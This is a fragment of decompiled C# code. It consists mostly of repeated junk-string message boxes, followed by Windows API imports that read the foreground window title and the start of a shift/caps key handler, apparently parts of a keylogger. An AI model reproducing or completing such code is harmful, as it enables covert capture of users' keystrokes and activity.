			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"laladsfh flalalalal lghfdghdfghaa", (MsgBoxStyle)0, (object)null);
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	public void four()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"m,dn234531245@#$!@#$^%$&#^f sdfkgsm dbnfg,.sdfjg;sl asdmf vzdlfgkdfgdsfg rfgsert", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"342589hnfg39fgnqer03", (MsgBoxStyle)0, (object)null);
	}

	private string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public void shiftandcaps(Keys Key)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Invalid comparison between Unknown and I4
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Invalid comparison between Unknown and I4
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Invalid comparison between Unknown and I4
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Invalid comparison between Unknown and I4
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Invalid comparison between Unknown and I4
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Invalid comparison between Unknown and I4
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Invalid comparison between Unknown and I4
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d1: Invalid comparison between Unknown and I4
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Invalid comparison between Unknown and I4
		//IL_0222: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Invalid comparison between Unknown and I4
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Invalid comparison between Unknown and I4
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0279: Invalid comparison between Unknown and I4
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a3: Invalid comparison between Unknown and I4
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Invalid comparison between Unknown and I4
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Invalid comparison between Unknown and I4
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Invalid comparison between Unknown and I4
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Invalid comparison between Unknown and I4
		//IL_0372: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Invalid comparison between Unknown and I4
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Invalid comparison between Unknown and I4
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Invalid comparison between Unknown and I4
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Invalid comparison between Unknown and I4
		//IL_041a: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Invalid comparison between Unknown and I4
		//IL_0444: Unknown result type (might be due to invalid IL or missing references)
		//IL_0447: Invalid comparison between Unknown and I4
		//IL_046e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0471: Invalid comparison between Unknown and I4
		//IL_0498: Unknown result type (might be due to invalid IL or missing references)
		//IL_049b: Invalid comparison between Unknown and I4
		//IL_04c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Invalid comparison between Unknown and I4
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ef: Invalid comparison between Unknown and I4
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0519: Invalid comparison between Unknown and I4
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Invalid comparison between Unknown and I4
		//IL_056a: Unknown result type (might be due to invalid IL or missing references)
		//IL_056d: Invalid comparison between Unknown and I4
		//IL_0594: Unknown result type (might be due to invalid IL or missing references)
		//IL_0597: Invalid comparison between Unknown and I4
		//IL_05be: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c1: Invalid comparison between Unknown and I4
		//IL_05e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Invalid comparison between Unknown and I4
		//IL_0612: Unknown result type (might be due to invalid IL or missing references)
		//IL_0615: Invalid comparison between Unknown and I4
		//IL_063c: Unknown result type (might be due to invalid IL or missing references)
		//IL_063f: Invalid comparison between Unknown and I4
		//IL_0666: Unknown result type (might be due to invalid IL or missing references)
		//IL_0669: Invalid comparison between Unknown and I4
		//IL_0690: Unknown result type (might be due to invalid IL or missing references)
		//IL_0693: Invalid comparison between Unknown and I4
		//IL_06ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bd: Invalid comparison between Unknown and I4
		//IL_06e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e7: Invalid comparison between Unknown and I4
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0711: Invalid comparison between Unknown and I4
		//IL_0738: Unknown result type (might be due to invalid IL or missing references)
		//IL_073b: Invalid comparison between Unknown and I4
		//IL_0762: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Invalid comparison between Unknown and I4
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_078f: Invalid comparison between Unknown and I4
		//IL_07b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bc: Invalid comparison between Unknown and I4
		//IL_07e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e9: Invalid comparison between Unknown and I4
		//IL_0810: Unknown result type (might be due to invalid IL or missing references)
		//IL_0816: Invalid comparison between Unknown and I4
		//IL_083d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0843: Invalid comparison between Unknown and I4
		//IL_086a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0870: Invalid comparison between Unknown and I4
		//IL_0897: Unknown result type (might be due to invalid IL or missing references)
		//IL_089d: Invalid comparison between Unknown and I4
		//IL_08c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ca: Invalid comparison between Unknown and I4
		//IL_08f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f7: Invalid comparison between Unknown and I4
		//IL_091e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0924: Invalid comparison between Unknown and I4
		//IL_094b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0951: Invalid comparison between Unknown and I4
		//IL_0978: Unknown result type (might be due to invalid IL or missing references)
		//IL_097b: Invalid comparison between Unknown and I4
		//IL_09a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a5: Invalid comparison between Unknown and I4
		//IL_09cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cf: Invalid comparison between Unknown and I4
		//IL_09f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f9: Invalid comparison between Unknown and I4
		//IL_0a20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a23: Invalid comparison between Unknown and I4
		//IL_0a4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4d: Invalid comparison between Unknown and I4
		//IL_0a74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a77: Invalid comparison between Unknown and I4
		//IL_0a9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa1: Invalid comparison between Unknown and I4
		//IL_0ac8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0acb: Invalid comparison between Unknown and I4
		//IL_0af2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af5: Invalid comparison between Unknown and I4
		//IL_0b1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1f: Invalid comparison between Unknown and I4
		//IL_0b46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b49: Invalid comparison between Unknown and I4
		//IL_0b70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b73: Invalid comparison between Unknown and I4
		//IL_0b9a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9d: Invalid comparison between Unknown and I4
		//IL_0bc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc7: Invalid comparison between Unknown and I4
		//IL_0bee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf0: Invalid comparison between Unknown and I4
		//IL_0c17: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c1a: Invalid comparison between Unknown and I4
		//IL_0c41: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c44: Invalid comparison between Unknown and I4
		//IL_0c6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6e: Invalid comparison between Unknown and I4
		//IL_0c95: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c98: Invalid comparison between Unknown and I4
		//IL_0cbf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc2: Invalid comparison between Unknown and I4
		//IL_0ce9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cec: Invalid comparison between Unknown and I4
